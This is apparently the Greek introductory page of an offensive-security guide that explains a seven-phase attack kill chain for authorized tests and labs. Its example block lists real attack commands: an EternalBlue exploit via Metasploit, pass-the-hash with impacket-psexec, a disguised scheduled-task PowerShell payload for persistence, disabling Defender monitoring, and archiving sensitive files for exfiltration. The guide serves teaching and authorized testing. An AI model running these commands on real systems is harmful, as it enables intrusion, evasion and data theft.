## Πριν ξεκινήσετε

Αυτή η ενότητα εξηγεί πώς συνδέονται μεταξύ τους τα στάδια μιας επίθεσης, ώστε ο αναγνώστης να κατανοεί τον σκοπό κάθε ελέγχου. Ξεκινήστε από την επισκόπηση και συνεχίστε με τη σειρά των οδηγών. Η διατήρηση της αγγλικής ορολογίας σε παρένθεση βοηθά να αναγνωρίζετε τους ίδιους όρους στα εργαλεία και στην τεκμηρίωσή τους.

**Πώς διαβάζουμε τα παραδείγματα:** Οι γραμμές μέσα στα πλαίσια κώδικα προέρχονται από το αγγλικό πρωτότυπο· τα επεξηγηματικά σχόλια έχουν μεταφραστεί. Δεν αποτελούν έτοιμη αυτοματοποιημένη επίθεση ούτε έχουν δοκιμαστεί στο δικό σας περιβάλλον. Κάθε οδηγός μπορεί να περιλαμβάνει εντολές από διαφορετικά λειτουργικά συστήματα ή κονσόλες εργαλείων. Στα πλαίσια `cmd`, οι γραμμές που αρχίζουν με `#` είναι επεξηγήσεις του οδηγού και δεν αντιγράφονται στο Command Prompt.

**Ενδεικτικές τιμές:** IP όπως `192.168.1.10`, τομείς όπως `domain.local`, ονόματα χρηστών και διαδρομές είναι παραδείγματα. Τιμές όπως `ATTACKER_IP`, `HASH`, `NTLM_HASH`, `BASE64_TICKET`, `CLSID` και `IEX(payload)` δηλώνουν στοιχεία που λείπουν ή πρέπει να προσαρμοστούν. Η παρουσία τους δεν σημαίνει ότι η εντολή είναι έτοιμη για εκτέλεση.

**Πεδίο χρήσης:** Οι οδηγοί προορίζονται για εξουσιοδοτημένους ελέγχους και απομονωμένα εργαστήρια. Ειδικά οι φάσεις 5–7 περιέχουν αλλαγές πρόσβασης, καταγραφών και δεδομένων που μπορούν να έχουν μόνιμες επιπτώσεις. Οι εξωτερικοί οδηγοί εργαλείων παραπέμπουν προς το παρόν στις αγγλικές εκδόσεις τους.

## 🎯 Τι είναι η αλυσίδα επίθεσης (Attack Kill Chain);

Η **αλυσίδα επίθεσης (Attack Kill Chain)** περιγράφει την εξέλιξη μιας επίθεσης από την αρχική πρόσβαση έως τις τελικές επιπτώσεις. Εδώ χρησιμοποιούμε μια πρακτική διάρθρωση επτά φάσεων για εκπαιδευτική μελέτη.

Το **Cyber Kill Chain** της Lockheed Martin και το **MITRE ATT&CK** είναι διαφορετικά μοντέλα: το πρώτο οργανώνει την επίθεση σε στάδια, ενώ το δεύτερο καταγράφει τακτικές και τεχνικές. Οι επτά φάσεις του παρόντος οδηγού δεν αποτελούν επίσημη αντιστοίχιση κανενός από τα δύο. Στην πράξη οι ενέργειες μπορούν να επαναλαμβάνονται ή να ακολουθούν διαφορετική σειρά. Δείτε τις [επίσημες πηγές](#resources).

## 📚 Πρώτη γνωριμία

### Παράδειγμα διαδοχής των φάσεων
```bash
# 1. Αρχική πρόσβαση — εκμετάλλευση μιας ευπάθειας
msfconsole -q -x "use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS 192.168.1.10; exploit"

# 2. Συλλογή πληροφοριών — έλεγχος της πρόσβασης που αποκτήθηκε
whoami /all
systeminfo
net user

# 3. Κλιμάκωση προνομίων — απόκτηση δικαιωμάτων SYSTEM/root
.\winPEAS.exe

# 4. Πλευρική μετακίνηση — πρόσβαση σε άλλα συστήματα
impacket-psexec -hashes :HASH administrator@192.168.1.20

# 5. Διατήρηση πρόσβασης
schtasks /create /tn "Updater" /tr "powershell -ep bypass -c IEX(payload)" /sc onlogon

# 6. Αποφυγή μηχανισμών άμυνας — παράδειγμα απενεργοποίησης προστασίας
Set-MpPreference -DisableRealtimeMonitoring $true

# 7. Τελικές ενέργειες — εξαγωγή δεδομένων
Compress-Archive -Path C:\Sensitive -DestinationPath C:\Temp\data.zip
```
